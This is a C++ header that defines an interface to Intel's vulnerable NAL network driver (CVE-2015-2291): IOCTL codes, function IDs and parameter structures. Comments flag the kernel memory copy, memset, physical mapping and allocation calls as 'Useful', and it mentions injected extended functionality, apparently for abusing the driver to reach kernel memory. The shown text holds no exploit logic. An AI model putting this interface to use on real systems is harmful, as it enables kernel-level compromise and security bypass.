
#pragma once
/*
  Copyright (c) 2021 Victor Sheinmann, Vicshann@gmail.com

  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), 
  to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, 
  and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. 
*/

//---------------------------------------------------------------------------
#define IN                // NOTE: Never do that, use comments instead
#define OUT
#define RETURN
#undef CopyMemory

#define NALBUILDEXTBLK
#define NALEXTLOGDBG

// TODO: Allow only SIZE_T, UINT32, UINT64
class CNalDrv  // Interface to a vulnerable Intel`s NAL driver (Intel-CVE-2015-2291)
{
//#define IOCTL_NAL_OSI NAL_MAKE_IOCTL(0)
//#define IOCTL_NAL_HW_BUS NAL_MAKE_IOCTL(1)
//#define IOCTL_NAL_NDI NAL_MAKE_IOCTL(2)
//#define IOCTL_NAL_OS_SPECIFIC NAL_MAKE_IOCTL(3)
public:
static const UINT32 IOCTL_NAL_OSI    = 0x80862007;  // 0x801 METHOD_NEITHER
static const UINT32 IOCTL_NAL_HW_BUS = 0x8086200B;  // 0x802 METHOD_NEITHER
static const UINT32 IOCTL_NAL_NDI    = 0x8086200F;  // 0x803 METHOD_NEITHER
static const UINT32 IOCTL_NAL_WIN    = 0x80862013;  // 0x804 METHOD_NEITHER  // IOCTL_NAL_OS_SPECIFIC
static const UINT32 IOCTL_NAL_EXT    = 0x8086201F;  // 0x807 METHOD_NEITHER  // Injected extended functionality

static const int NAL_MAX_BARS = 6;
static const int NAL_MAX_DEBUG_PRINT_LENGTH = 200;

static const UINT NAL_CODE_SUCCESS = 0x0;
static const UINT NAL_CODE_INFORMATIONAL = 0x1;
static const UINT NAL_CODE_WARNING = 0x2;
static const UINT NAL_CODE_ERROR = 0x3;

static const UINT OEM_NONE = 0x00;
static const UINT OEM_INTEL = 0x86;

static const UINT CODE_GENERAL = 0x0;
static const UINT CODE_NAL = 0xA;


enum ENalCodeA   // 80862007    // NalResolveOsiIoctl
{
 NAL_READPORT8_FUNCID = 1,
 NAL_READPORT16_FUNCID = 2,
 NAL_READPORT32_FUNCID = 3,
 NAL_WRITEPORT8_FUNCID = 7,
 NAL_WRITEPORT16_FUNCID = 8,
 NAL_WRITEPORT32_FUNCID = 9,
 NAL_READREGISTER8_FUNCID = 13,
 NAL_READREGISTER16_FUNCID = 14,
 NAL_READREGISTER32_FUNCID = 15,
 NAL_WRITEREGISTER8_FUNCID = 19,
 NAL_WRITEREGISTER16_FUNCID = 20,
 NAL_WRITEREGISTER32_FUNCID = 21,
 NAL_MMAPADDRESS_FUNCID = 25,      // <<< Useful
 NAL_UNMAPADDRESS_FUNCID = 26,     // <<< Useful
 NAL_GETTIMESTAMP_FUNCID = 27,
 NAL_GETTIMESTAMPSPERMICROSECOND_FUNCID = 28,
 NAL_REGISTERTIMERCALLBACK_FUNCID = 33,
 NAL_UNREGISTERTIMERCALLBACK_FUNCID = 34,
 NAL_DELAYMILLISECONDS_FUNCID = 35,
 NAL_DELAYMICROSECONDS_FUNCID = 36,
 NAL_GETPHYSICALMEMORYADDRESS_FUNCID = 37,    // <<< Useful
 NAL_ALLOCATEMEMORYNONPAGED_FUNCID = 38,      // <<< Useful
 NAL_FREEMEMORYNONPAGED_FUNCID = 39,          // <<< Useful
 NAL_ATOMICINCREMENT32_FUNCID = 40,
 NAL_ATOMICDECREMENT32_FUNCID = 41,
 NAL_ATOMICTESTSET32_FUNCID = 42,
 NAL_ACQUIRESPINLOCK_FUNCID = 43,
 NAL_RELEASESPINLOCK_FUNCID = 44,
 NAL_INITIALIZESPINLOCK_FUNCID = 45,
 NAL_CHECKSECURITY_FUNCID = 46,
 NAL_DEBUGPRINT_FUNCID = 47,
 NAL_KMEMSET_FUNCID = 48,          // <<< Useful
 NAL_KUMEMCPY_FUNCID = 49,
 NAL_KKMEMCPY_FUNCID = 50,
 NAL_UKMEMCPY_FUNCID = 51,         // <<< Useful
 NAL_ENABLE_DEBUG_PRINT_FUNCID = 54,
 NAL_ALLOCATEMEMORYNONPAGEDEX_FUNCID = 55,   // <<< Useful ?
 NAL_FREEMEMORYNONPAGEDEX_FUNCID = 56,       // <<< Useful ?
 NAL_MMAPADDRESSEX_FUNCID = 57,              // <<< Useful ?
 NAL_UNMAPADDRESSEX_FUNCID = 58,             // <<< Useful ?
 NAL_GETPHYSICALMEMORYADDRESSEX_FUNCID = 59, // <<< Useful ?   // A real IO space expected, non paged pool
};

enum ENalCodeB   // 8086200B    // NalResolveHwBusIoctl
{
 NAL_READPCIDEVICECOUNT_FUNCID = 1,
 NAL_READPCIDEVICE_FUNCID = 2,
 NAL_FILLPCICONFIGSPEC_FUNCID = 3,
 NAL_OSREADPCICONFIG32_FUNCID = 4,
 NAL_OSWRITEPCICONFIG32_FUNCID = 5,
 NAL_OSWRITEPCICONFIGVARIABLE_FUNCID = 6,
 NAL_ENABLEPCIDEVICE_FUNCID = 7,
};

enum ENalCodeC   // 8086200F    // NalResolveNdiIoctl
{
 NAL_INITIALIZEINTERRUPTS_FUNCID = 1,
 NAL_HASINTERRUPTOCCURRED_FUNCID = 2,
 NAL_UNINITIALIZEINTERRUPTS_FUNCID = 3,
};

enum ENalCodeD   // 80862013
{
 NAL_WIN_GET_PDO_POINTER_FUNCID = 1,
 NAL_WIN_GET_SYMBOLIC_NAME_FUNCID = 2,
 NAL_WIN_ALLOC_DEV_CONTEXT_FUNCID = 3,
 NAL_WIN_FREE_DEV_CONTEXT_FUNCID = 4,
 NAL_WIN_OS_DEVICE_FUNCID = 5,
 NAL_WIN_DRIVER_GET_REF_COUNT_FUNCID = 6,
 NAL_WIN_ADAPTER_IN_USE_FUNCID = 7,
 NAL_WIN_IS_ADAPTER_IN_USE_FUNCID = 8,
};

enum ENalCodeE    // Unimplemented
{
 NAL_LINUX_IS_ADAPTER_IN_USE_FUNCID = 1,
 NAL_LINUX_ADAPTER_IN_USE_FUNCID = 2,
 NAL_LINUX_REQUEST_REGIONS_FUNCID = 3,
 NAL_LINUX_RELEASE_REGIONS_FUNCID = 4,
 NAL_LINUX_GET_DRIVER_REFCOUNT_FUNCID = 5,
 NAL_LINUX_INC_DRIVER_REFCOUNT_FUNCID = 6,
 NAL_LINUX_DEC_DRIVER_REFCOUNT_FUNCID = 7,
 NAL_LINUX_FILL_DEVICE_RESOURCE_FUNCID = 8,
 NAL_LINUX_DRIVER_GET_VERSION = 9,
 NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNCID = 10,
 NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNCID = 11,
 NAL_LINUX_READPCIEXBYTE_FUNCID = 12,
 NAL_LINUX_WRITEPCIEXBYTE_FUNCID = 13,
 NAL_LINUX_GET_RUN_DOMAIN_FUNCID = 14,
};
                 
enum ENalCodeF    // Unimplemented
{
 NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNCID = 1,
 NAL_SOLARIS_ADAPTER_IN_USE_FUNCID = 2,
 NAL_SOLARIS_REQUEST_REGIONS_FUNCID = 3,
 NAL_SOLARIS_RELEASE_REGIONS_FUNCID = 4,
 NAL_SOLARIS_GET_DRIVER_REFCOUNT_FUNCID = 5,
 NAL_SOLARIS_DRIVER_GET_VERSION = 9,
 NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNCID = 10,
 NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNCID = 11,
};


enum NAL_OS_TYPE
{
    NAL_OS_UNKNOWN = 0,
    NAL_OS_DOS,
    NAL_OS_EFI32,
    NAL_OS_EFI64,
    NAL_OS_LINUX32,
    NAL_OS_WIN3XX,
    NAL_OS_WIN9X,
    NAL_OS_OS2,
    NAL_OS_WINNT4,
    NAL_OS_WIN2K,
    NAL_OS_WINXP32,
    NAL_OS_WINXP64,
    NAL_OS_WINXP64E,
    NAL_OS_LINUX64,
    NAL_OS_FREEBSD32,
    NAL_OS_FREEBSD64,
    NAL_OS_LINUX64E,
    NAL_OS_NWS,
    NAL_OS_EFI64E,
    NAL_OS_LINUXPPC,
    NAL_OS_LINUXPPC64,
    NAL_OS_COUNT,
    NAL_OS_SOLARIS_X86,
    NAL_OS_SOLARIS_64E,
    NAL_OS_SOLARIS_SPARC32,
    NAL_OS_SOLARIS_SPARC64
};

enum NAL_OS_RUN_DOMAIN
{
    NAL_OS_DOMAIN_BAREMETAL = 0,
    NAL_OS_DOMAIN_0,
    NAL_OS_DOMAIN_U
};

enum NAL_IO_RESOURCE_TYPE
{
    NAL_IO_TYPE_UNUSED = 0,
    NAL_IO_TYPE_IO,
    NAL_IO_TYPE_MEM
};
//===========================================================================
template<typename KPTR=SIZE_T> struct SNalDefs
{
//typedef VOID KVOID;
typedef UINT32 NAL_STATUS;
typedef UINT16 PORT_ADDR;
typedef UINT64 NAL_PHYSICAL_ADDRESS;
typedef unsigned int UINTN;
typedef UINT8 BOOLEAN;
typedef UINTN NAL_MAC_TYPE;
typedef volatile UINT32 NAL_SPIN_LOCK;

typedef VOID (*NAL_TIMER_CALLBACK) (KPTR);
typedef KPTR (*NAL_THREAD_FUNC) (KPTR);


typedef union _NAL_UNSIGNED_UNION
{
    UINT8  Uint8;
    UINT16 Uint16;
    UINT32 Uint32;
    UINT64 Uint64;
} NAL_UNSIGNED_UNION;



typedef struct _NAL_IO_RESOURCE
{
    NAL_IO_RESOURCE_TYPE Type;
    NAL_PHYSICAL_ADDRESS MemoryAddress;
} NAL_IO_RESOURCE;

typedef union _NAL_DEVICE_LOCATION   // Max size is unknown!!!!!!!!!!!!!!!!!
{
//    PCI_SLOT_ID Pci;
//    PCI_EXPRESS_SLOT_ID PciExpress;
//    VF_SLOT_ID Vf;
//    CARDBUS_SLOT_ID Cardbus;
//    NAL_OS_SLOT_ID OsDeviceLocation;
    UINT8 UnkSize[256];    
    UINT64 Reserved;
} NAL_DEVICE_LOCATION;

typedef struct _PCI_DEVICE
{
#if defined (NAL_BIG_ENDIAN)
    UINT16 DeviceId;
    UINT16 VendorId;
    UINT16 StatusRegister;
    UINT16 CommandRegister;
    UINT8 ClassCode;
    UINT8 SubclassCode;
    UINT8 ProgIf;
    UINT8 RevisionId;
    UINT8 Bist;
    UINT8 HeaderType;
    UINT8 LatencyTimer;
    UINT8 CacheLineSize;
    UINT32 Bar0;
    UINT32 Bar1;
    UINT32 Bar2;
    UINT32 Bar3;
    UINT32 Bar4;
    UINT32 Bar5;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemId;
    UINT16 SubsystemVendorId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 Reserved[3];
    UINT8 CapabilitiesPointer;
    UINT32 Reserved2;
    UINT8 MaxLatency;
    UINT8 MinGrant;
    UINT8 InterruptPin;
    UINT8 InterruptLine;
#else
    UINT16 VendorId;
    UINT16 DeviceId;
    UINT16 CommandRegister;
    UINT16 StatusRegister;
    UINT8 RevisionId;
    UINT8 ProgIf;
    UINT8 SubclassCode;
    UINT8 ClassCode;
    UINT8 CacheLineSize;
    UINT8 LatencyTimer;
    UINT8 HeaderType;
    UINT8 Bist;
    UINT32 Bar0;
    UINT32 Bar1;
    UINT32 Bar2;
    UINT32 Bar3;
    UINT32 Bar4;
    UINT32 Bar5;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemVendorId;
    UINT16 SubsystemId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 CapabilitiesPointer;
    UINT8 Reserved[3];
    UINT32 Reserved2;
    UINT8 InterruptLine;
    UINT8 InterruptPin;
    UINT8 MinGrant;
    UINT8 MaxLatency;
#endif

    UINT32 ConfigSpace[48];
} PCI_DEVICE;

typedef struct _NAL_WIN_DRIVER_GET_REF_COUNT_FUNC
{
    OUT UINT32 RefCount;
} NAL_WIN_DRIVER_GET_REF_COUNT_FUNC;

typedef struct _NAL_ADAPTER_IN_USE_FUNC
{
    IN NAL_DEVICE_LOCATION NalDevice;
    OUT BOOLEAN CanBeUsed;
    OUT BOOLEAN Locked;
} NAL_WIN_ADAPTER_IN_USE_FUNC,
  NAL_LINUX_ADAPTER_IN_USE_FUNC,
  NAL_SOLARIS_ADAPTER_IN_USE_FUNC;

typedef struct _NAL_IS_ADAPTER_IN_USE_FUNC
{
    IN NAL_DEVICE_LOCATION NalDevice;
    OUT BOOLEAN IsInUse;
} NAL_WIN_IS_ADAPTER_IN_USE_FUNC,
  NAL_LINUX_IS_ADAPTER_IN_USE_FUNC,
  NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNC;

typedef struct _NAL_ENABLE_DEBUG_PRINT_FUNC
{
    IN BOOLEAN Enable;
} NAL_ENABLE_DEBUG_PRINT_FUNC;

typedef struct _NAL_WIN_GET_PDO_POINTER_FUNC
{
    IN OUT KPTR DeviceContext;
    IN NAL_DEVICE_LOCATION PciLocation;
} NAL_WIN_GET_PDO_POINTER_FUNC;

typedef struct _NAL_WIN_GET_SYMBOLIC_NAME_FUNC
{
    IN  KPTR DeviceContext;
    OUT CHAR SymbolicName[260];
} NAL_WIN_GET_SYMBOLIC_NAME_FUNC;

typedef struct _NAL_WIN_ALLOC_DEV_CONTEXT_FUNC
{
    RETURN KPTR ReturnValue;
} NAL_WIN_ALLOC_DEV_CONTEXT_FUNC;

typedef struct _NAL_WIN_FREE_DEV_CONTEXT_FUNC
{
    IN KPTR DeviceContext;
} NAL_WIN_FREE_DEV_CONTEXT_FUNC;

typedef struct _NAL_LINUX_DEVICERESOURCE_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION DeviceLocation;
    OUT NAL_IO_RESOURCE NalIoResource[NAL_MAX_BARS];
    OUT KPTR Pdev;
} NAL_LINUX_DEVICERESOURCE_FUNC,
  NAL_SOLARIS_REGION_FUNCS;

typedef struct _NAL_LINUX_REFCOUNT_FUNCS
{
    RETURN UINT32 ReturnValue;
} NAL_LINUX_REFCOUNT_FUNCS,
  NAL_SOLARIS_REFCOUNT_FUNCS;

typedef struct _NAL_LINUX_DRIVER_GET_VERSION_FUNCS
{
    OUT CHAR Version[32];
} NAL_LINUX_DRIVER_GET_VERSION_FUNCS,
  NAL_SOLARIS_DRIVER_GET_VERSION_FUNCS;

typedef struct _NAL_OS_DEVICE_FUNC
{
    IN NAL_MAC_TYPE MacType;
    IN NAL_DEVICE_LOCATION DeviceLocation;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN KPTR VirtualAddress;
    IN PORT_ADDR PortAddress;
    IN BOOLEAN IsDriverLoaded;
    IN OUT KPTR DeviceContext;
    RETURN NAL_STATUS NalStatus;
} NAL_OS_DEVICE_FUNC;

typedef struct _NAL_INTERRUPT_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    RETURN BOOLEAN Triggered;
    IN KPTR NalOsDevice;
} NAL_INTERRUPT_FUNCS;

typedef struct _NAL_READPORT_FUNCS
{
    NAL_UNSIGNED_UNION ReturnValue;
    PORT_ADDR Port;
} NAL_READPORT_FUNCS;

typedef struct _NAL_WRITEPORT_FUNCS
{
    RETURN BOOLEAN ReturnValue;
    IN PORT_ADDR Port;
    IN NAL_UNSIGNED_UNION Value;
} NAL_WRITEPORT_FUNCS;

typedef struct _NAL_READREGISTER_FUNCS
{
    RETURN NAL_UNSIGNED_UNION ReturnValue;
    IN KPTR Address;
} NAL_READREGISTER_FUNCS;

typedef struct _NAL_READREGISTER_FUNCS_Ex
{
    RETURN NAL_UNSIGNED_UNION ReturnValue;
    IN KPTR Address;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_READREGISTER_FUNCS_Ex;

typedef struct _NAL_WRITEREGISTER_FUNCS
{
    RETURN BOOLEAN ReturnValue;
    IN KPTR Address;
    IN NAL_UNSIGNED_UNION Value;
} NAL_WRITEREGISTER_FUNCS;
typedef struct _NAL_WRITEREGISTER_FUNCS_Ex
{
    RETURN BOOLEAN ReturnValue;
    IN KPTR Address;
    IN NAL_UNSIGNED_UNION Value;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_WRITEREGISTER_FUNCS_Ex;

typedef struct _NAL_MEMMAP_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    OUT KPTR VirtualAddress;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN OUT UINT32 Length;
    IN UINTN ProcessId;
} NAL_MEMMAP_FUNCS;

typedef struct _NAL_TIMESTAMP_FUNCS
{
    RETURN UINT64 ReturnValue;
} NAL_TIMESTAMP_FUNCS;

typedef struct _NAL_REGISTERTIMERCALLBACK_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_TIMER_CALLBACK TimerCallback;
    IN OUT UINT32 TimerInterval;
    IN UINTN Context;
    OUT UINT32 CallbackId;
} NAL_REGISTERTIMERCALLBACK_FUNC;

typedef struct _NAL_UNREGISTERTIMERCALLBACK_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN UINT32 CallbackId;
} NAL_UNREGISTERTIMERCALLBACK_FUNC;

typedef struct _NAL_DELAY_FUNCS
{
    IN UINT32 Delay;
} NAL_DELAY_FUNCS;

typedef struct _NAL_GETPHYSICALMEMORYADDRESS_FUNC
{
    RETURN NAL_PHYSICAL_ADDRESS ReturnValue;
    IN KPTR VirtualAddress;
    IN UINTN ProcessId;
} NAL_GETPHYSICALMEMORYADDRESS_FUNC;

typedef struct _NAL_ALLOCATEMEMORYNONPAGED_FUNC
{
    RETURN KPTR ReturnValue;
    IN UINT32 ByteCount;
    IN UINT32 Alignment;
    OUT NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINTN ProcessId;
} NAL_ALLOCATEMEMORYNONPAGED_FUNC;

typedef struct _NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC
{
    IN KPTR PDev;
    RETURN KPTR ReturnValue;
    IN UINT32 ByteCount;
    IN UINT32 Alignment;
    OUT NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINTN ProcessId;
} NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC,
    NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNC;

typedef struct _NAL_FREEMEMORYNONPAGED_FUNC
{
    IN KPTR Address;
    IN UINTN ProcessId;
} NAL_FREEMEMORYNONPAGED_FUNC;

typedef struct _NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC
{
    IN KPTR PDev;
    IN KPTR Address;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINT32 Size;
} NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC,
    NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNC;

typedef struct _NAL_ATOMIC_FUNCS
{
    RETURN UINT32 ReturnValue;
    IN OUT UINT32* Address;
} NAL_ATOMIC_FUNCS;

typedef struct _NAL_ATOMICTESTSET32_FUNC
{
    RETURN UINT32 ReturnValue;
    IN OUT UINT32* Address;
    IN UINT32 Test;
    IN UINT32 Set;
} NAL_ATOMICTESTSET32_FUNC;

typedef struct _NAL_SPINLOCK_FUNCS
{
    NAL_SPIN_LOCK SpinLock;
} NAL_SPINLOCK_FUNCS;

typedef struct _NAL_CHECKSECURITY_FUNC
{
    RETURN NAL_STATUS ReturnValue;
} NAL_CHECKSECURITY_FUNC;

typedef struct _NAL_DEBUGPRINT_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN CHAR Message[NAL_MAX_DEBUG_PRINT_LENGTH];
} NAL_DEBUGPRINT_FUNC;

typedef struct _NAL_READPCIDEVICECOUNT_FUNC
{
    RETURN UINT16 ReturnValue;
} NAL_READPCIDEVICECOUNT_FUNC;

typedef struct _NAL_READPCIDEVICE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN UINT16 Count;
    OUT NAL_DEVICE_LOCATION PciLocations[1];
} NAL_READPCIDEVICE_FUNC;

typedef struct _NAL_FILLPCICONFIGSPEC_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordCount;
    OUT PCI_DEVICE PciDevice;
} NAL_FILLPCICONFIGSPEC_FUNC;

typedef struct _NAL_OSREADPCICONFIG32_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    OUT UINT32 Value;
} NAL_OSREADPCICONFIG32_FUNC;

typedef struct _NAL_OSWRITEPCICONFIG32_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    IN UINT32 Data;
} NAL_OSWRITEPCICONFIG32_FUNC;

typedef struct _NAL_OSWRITEPCICONFIGVARIABLE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    IN UINT8 ByteMask;
    IN UINT32 Data;
} NAL_OSWRITEPCICONFIGVARIABLE_FUNC;

typedef struct _NAL_LINUX_OSREADPCIEXBYTE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 ByteIndex;
    OUT UINT8 Value;
} NAL_LINUX_READPCIEXBYTE_FUNC;

typedef struct _NAL_LINUX_WRITEPCIEXBYTE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 ByteIndex;
    IN UINT8 Value;
} NAL_LINUX_WRITEPCIEXBYTE_FUNC;

typedef struct _NAL_KMEM_FUNCS
{
    IN KPTR Source;
    IN KPTR Destination;
    IN UINTN Size;
} NAL_KMEM_FUNCS;

typedef struct _NAL_KMEMSET_FUNC
{
    IN int Source;
    IN KPTR Destination;
    IN UINTN Size;
} NAL_KMEMSET_FUNC;

typedef struct _NAL_ENABLEPCIDEVICE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_ENABLEPCIDEVICE_FUNC;

typedef struct _NAL_LINUX_RUN_DOMAIN_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    OUT NAL_OS_RUN_DOMAIN RunDomain;
} NAL_LINUX_RUN_DOMAIN_FUNC;

typedef union _NAL_IOCTL_FUNCTION_DATA
{

    NAL_READPORT_FUNCS NalReadPortFuncs;
    NAL_WRITEPORT_FUNCS NalWritePortFuncs;
    NAL_READREGISTER_FUNCS NalReadRegisterFuncs;
    NAL_WRITEREGISTER_FUNCS NalWriteRegisterFuncs;
    NAL_MEMMAP_FUNCS NalMemmapFuncs;
    NAL_TIMESTAMP_FUNCS NalTimestampFuncs;
    NAL_INTERRUPT_FUNCS NalInterruptFuncs;
    NAL_REGISTERTIMERCALLBACK_FUNC NalRegisterTimerCallbackFunc;
    NAL_UNREGISTERTIMERCALLBACK_FUNC NalUnregisterTimerCallbackFunc;
    NAL_GETPHYSICALMEMORYADDRESS_FUNC NalGetPhysicalMemoryAddressFunc;
    NAL_DELAY_FUNCS NalDelayFuncs;
    NAL_ALLOCATEMEMORYNONPAGED_FUNC NalAllocateMemoryNonPagedFunc;
    NAL_FREEMEMORYNONPAGED_FUNC NalFreeMemoryNonPagedFunc;
    NAL_ATOMIC_FUNCS NalAtomicFuncs;
    NAL_ATOMICTESTSET32_FUNC NalAtomicTestSet32Func;
    NAL_SPINLOCK_FUNCS NalSpinlockFuncs;
    NAL_CHECKSECURITY_FUNC NalCheckSecurityFunc;
    NAL_DEBUGPRINT_FUNC NalDebugPrintFunc;
    NAL_KMEM_FUNCS NalKMemFuncs;
    NAL_KMEMSET_FUNC NalKMemsetFunc;
    NAL_ENABLE_DEBUG_PRINT_FUNC NalEnableDebugPrintFunc;

    NAL_READPCIDEVICECOUNT_FUNC NalReadPciDeviceCountFunc;
    NAL_READPCIDEVICE_FUNC NalReadPciDeviceFunc;
    NAL_FILLPCICONFIGSPEC_FUNC NalFillPciConfigSpecFunc;
    NAL_OSREADPCICONFIG32_FUNC NalOsReadPciConfig32Func;
    NAL_OSWRITEPCICONFIG32_FUNC NalOsWritePciConfig32Func;
    NAL_OSWRITEPCICONFIGVARIABLE_FUNC NalOsWritePciConfigVariableFunc;
    NAL_ENABLEPCIDEVICE_FUNC NalEnablePciDeviceFunc;

#if defined(NAL_WINNT_WDM)

    NAL_WIN_GET_PDO_POINTER_FUNC NalWinGetPdoPointerFunc;
    NAL_WIN_GET_SYMBOLIC_NAME_FUNC NalWinGetSymbolicNameFunc;
    NAL_WIN_ALLOC_DEV_CONTEXT_FUNC NalWinAllocDevContextFunc;
    NAL_WIN_FREE_DEV_CONTEXT_FUNC NalWinFreeDevContextFunc;
    NAL_OS_DEVICE_FUNC NalOsDevice;
    NAL_WIN_DRIVER_GET_REF_COUNT_FUNC NalWinDriverGetRefCountFunc;
    NAL_WIN_ADAPTER_IN_USE_FUNC NalWinAdapterInUseFunc;
    NAL_WIN_IS_ADAPTER_IN_USE_FUNC NalWinIsAdapterInUseFunc;
#endif

#if defined(NAL_LINUX)

    NAL_LINUX_ADAPTER_IN_USE_FUNC NalLinuxAdapterInUseFunc;
    NAL_LINUX_IS_ADAPTER_IN_USE_FUNC NalLinuxIsAdapterInUseFunc;
    NAL_LINUX_REFCOUNT_FUNCS NalLinuxReferenceCountFuncs;
    NAL_LINUX_DEVICERESOURCE_FUNC NalLinuxDeviceResourceFunc;
    NAL_LINUX_DRIVER_GET_VERSION_FUNCS NalLinuxDriverGetVersionFuncs;
    NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC NalLinuxAllocateMemoryNonPagedPciFunc;
    NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC NalLinuxFreeMemoryNonPagedPciFunc;
    NAL_LINUX_READPCIEXBYTE_FUNC NalLinuxReadPciExByteFunc;
    NAL_LINUX_WRITEPCIEXBYTE_FUNC NalLinuxWritePciExByteFunc;
    NAL_LINUX_RUN_DOMAIN_FUNC NalLinuxGetRunDomainFunc;
#endif

#if defined(NAL_SOLARIS)

    NAL_READREGISTER_FUNCS_Ex NalReadRegisterFuncsEx;
    NAL_WRITEREGISTER_FUNCS_Ex NalWriteRegisterFuncsEx;

    NAL_SOLARIS_ADAPTER_IN_USE_FUNC NalSolarisAdapterInUseFunc;
    NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNC NalSolarisIsAdapterInUseFunc;
    NAL_SOLARIS_REGION_FUNCS NalSolarisRegionFuncs;
    NAL_SOLARIS_REFCOUNT_FUNCS NalSolarisReferenceCountFuncs;
    NAL_SOLARIS_DRIVER_GET_VERSION_FUNCS NalSolarisDriverGetVersionFuncs;
    NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNC NalSolarisAllocateMemoryNonPagedPciFunc;
    NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNC NalSolarisFreeMemoryNonPagedPciFunc;

#endif
} NAL_IOCTL_FUNCTION_DATA;

/*typedef struct _NAL_IOCTL
{
    UINT32 IoctlNumber;
    VOID* InputBuffer;
    UINT32 InputBufferSize;
    VOID* OutputBuffer;
    UINT32 OutputBufferSize;
} NAL_IOCTL; */

typedef union _NAL_IOCTL_RETURN_DATA
{
    UINT8 Uint8;
    UINT16 Uint16;
    UINT32 Uint32;
    UINT64 Uint64;
    NAL_STATUS NalStatus;
    UINTN VoidPtr;
} NAL_IOCTL_RETURN_DATA;

typedef struct _NAL_IOCTL_INPUT_DATA
{
    UINT64 FunctionId;
    UINT32 Size;
   alignas(sizeof(KPTR)) NAL_IOCTL_FUNCTION_DATA InputBuffer;
} NAL_IOCTL_INPUT_DATA;


static inline constexpr UINT NalMakeCode(const UINT32 Type,const UINT32 Library, const UINT32 Number){return (Type << 30)|(OEM_INTEL << 20)|(Library << 16)|Number;}  // A static constexpr member function does not evaluate to a constant(If used in the same class)!!!!!   // Put it in a base or separate class
//===========================================================================      
};  // SNalDefs


//static inline SIZE_T NAL_IOCTL_INPUTBUFFER_SIZE(NAL_IOCTL_INPUT_DATA* Data){return (sizeof(UINT64) * 2) + Data->Size;}
//static inline constexpr UINT NalMakeCode(const UINT32 Type,const UINT32 Library, const UINT32 Number){return (Type << 30)|(OEM_INTEL << 20)|(Library << 16)|Number;}  // A static constexpr member function does not evaluate to a constant(If used in the same class)!!!!!

enum ENalErrs {
 NAL_SUCCESS = 0,
 NAL_INVALID_PARAMETER = 1,
 NAL_NOT_ENOUGH_SPACE = SNalDefs<>::NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0002),  // "Not enough space"
};

/*
#define NAL_SUCCESS 0
#define NAL_INVALID_PARAMETER 1
#define NAL_NOT_ENOUGH_SPACE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0002, "Not enough space")
#define NAL_NOT_IMPLEMENTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0003, "Not Implemented")
#define NAL_TIMEOUT_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0004, "Timeout Error")
